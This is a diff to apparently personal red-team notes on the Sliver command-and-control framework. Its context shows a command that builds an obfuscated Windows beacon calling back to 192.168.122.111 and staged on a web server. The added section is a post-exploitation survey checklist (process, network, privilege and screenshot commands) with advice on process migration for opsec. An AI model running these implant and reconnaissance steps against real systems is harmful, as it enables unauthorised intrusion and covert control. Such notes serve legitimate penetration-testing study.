@@ -56,7 +56,7 @@ sliver > jobs
 
 ### Transfer Binary to Target&#x20;
 
-<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 ### Execute The Binary
 
@@ -152,4 +152,29 @@ sliver > generate beacon --mtls 192.168.122.111 --os windows --arch amd64 --form
 [*] Symbol obfuscation is enabled
 [*] Build completed in 00:00:18
 [*] Implant saved to /var/www/html/STALE_PNEUMONIA.exe
+```
+
+### Sliver Survey
+
+* Execute the following commands in order upon session opening
+
+```
+info               Get info about session
+getgid             Get session process GID
+getpid             Get session pid
+getuid             Get session process UID
+whoami             Get session user execution context
+ps                 List remote processes
+netstat            Print network connection information
+pwd                Print working directory
+ls                 List current directory
+screenshot         Take a screenshot
+getprivs          Get current privileges (Windows only)
+```
+
+* After this general survey, decide if you want/need (opsec) to migrate to a new process or not.
+
+```
+migrate           Migrate into a remote process
+getprivs          Get current privileges (Windows only)
 ```
